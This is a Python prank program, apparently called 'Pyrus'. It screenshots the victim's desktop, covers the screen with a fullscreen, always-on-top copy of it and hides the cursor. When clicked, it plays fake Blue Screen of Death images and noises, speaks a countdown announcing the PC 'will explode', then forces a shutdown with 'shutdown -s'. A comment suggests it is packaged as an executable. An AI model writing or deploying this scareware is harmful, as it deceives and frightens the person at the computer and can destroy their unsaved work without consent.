import time
import pyttsx3
import pyautogui # diaxirizeste to mouse kai to keyboard meso kwdika, hotkeys , mouseclicks etc
import tkinter as tk
import speech_recognition
import os
import sys
import winsound
from PIL import Image, ImageTk
#C:\Users\User\Desktop\projects\PythonProjects\Python2\Pyrus/Pyrus
dir = os.path.dirname(os.path.abspath(sys.argv[0]))
print(dir)
def speakText(command):
    engine = pyttsx3.init() 
    rate = engine.getProperty('rate') 
    voices = engine.getProperty('voices')
    engine.setProperty('voice', voices[0].id)  
    engine.setProperty('rate',  rate-1000) 
    engine.say(command)
    engine.runAndWait()
def initiate(event):

    updateImg(1, 2)
    winsound.PlaySound(dir + '/noise1.wav', winsound.SND_FILENAME)
    updateImg(2, 3)
    updateImg(3, 2)
    updateImg(4, 3)
    updateImg(5, 3)
    winsound.PlaySound(dir + '/noise3.wav', winsound.SND_FILENAME)
    updateImg(7, 0.5)
    winsound.PlaySound(dir + '/noise2.wav', winsound.SND_FILENAME)
    updateImg(5, 0.3)
    winsound.PlaySound(dir + '/noise1.wav', winsound.SND_FILENAME)
    winsound.PlaySound(dir + '/noise3.wav', winsound.SND_FILENAME)
    updateImg(6, 3)
    winsound.PlaySound(dir + '/noise1.wav', winsound.SND_FILENAME)
    winsound.PlaySound(dir + '/noise3.wav', winsound.SND_FILENAME)
    winsound.PlaySound(dir + '/noise1.wav', winsound.SND_FILENAME)
    winsound.PlaySound(dir + '/noise2.wav', winsound.SND_FILENAME)
    speakText("Your pc will explode in")
    speakText("in 5")
    speakText("4")
    speakText("3")
    speakText("2")
    speakText("1")
    speakText("Explosion")
    os.system('shutdown -s')

def updateGif(imgNo, timeNo): # updateImg(1, 2) tha anoigei to bsod1.png gia 2sec
    imgName = dir+"/BSOD/bsodgif/frame_"+str(imgNo)+"_delay-0.05s.png" # str(kati) kanei to kati na einai text
    # C:\Users\IT-EXPERTS\PycharmProjects\pythonProject\Python2\Pyrus\BSOD\bsod1.png
    img = Image.open(imgName).resize((window.winfo_screenwidth(),
                                     window.winfo_screenheight()), Image.LANCZOS)
    #LANCZOS einai enas tropos gia na ginei swsto resize stin eikona
    bg1 = ImageTk.PhotoImage(img) # ftiaxnw metavliti pou krataei tin eikona tou bsod
    bglabel.configure(image = bg1, cursor = "none")
    # allazw tin eikona tou label, anti na exei to print screen
    # na exei mia apo ta bsod
    bglabel.image = bg1
    window.update()
    time.sleep(timeNo)

def updateImg(imgNo, timeNo): # updateImg(1, 2) tha anoigei to bsod1.png gia 2sec
    imgName = dir+"/BSOD/bsod"+str(imgNo)+".png" # str(kati) kanei to kati na einai text
    # C:\Users\IT-EXPERTS\PycharmProjects\pythonProject\Python2\Pyrus\BSOD\bsod1.png
    img = Image.open(imgName).resize((window.winfo_screenwidth(),
                                      window.winfo_screenheight()), Image.LANCZOS)
    #LANCZOS einai enas tropos gia na ginei swsto resize stin eikona
    bg1 = ImageTk.PhotoImage(img) # ftiaxnw metavliti pou krataei tin eikona tou bsod
    bglabel.configure(image = bg1, cursor = 'none')
    # allazw tin eikona tou label, anti na exei to print screen auto-py-to-exe
    # na exei mia apo ta bsod
    bglabel.image = bg1
    window.update()
    time.sleep(timeNo)


time.sleep(1)
pyautogui.hotkey("win" , "d")#windows + d na me paei sthn epifaneia ergasias
time.sleep(1)
ps = pyautogui.screenshot("desktop.png")#pernei print to screen (ps) kai meta to kanei save ston fakelo pyrus

window = tk.Tk()  #etsi ftiaxnw parathiro sto tkinter
window.geometry("{}x{}+0+0".format(window.winfo_screenwidth() , window.winfo_screenheight())) # dinw sto parathyro diastaseis analoga me tin othoni pou tha treksei o ios

bg = tk.PhotoImage(file="desktop.png")
bglabel = tk.Label(window , image = bg, width= window.winfo_screenwidth() , height= window.winfo_screenheight())

bglabel.place (x = 0 , y = 0)

time.sleep(2)


bglabel.bind("<Button-1>" , initiate)#button 1 left click , button 2 right click
window.attributes("-fullscreen" , True)#vazw parathrio se fullscreen
window.attributes("-topmost", True)#ma vgei to parahiro apo elaxistopoihsh
window.bind()
window.update()





window.mainloop() # panta sto tkinter kleinw me auti tin entoli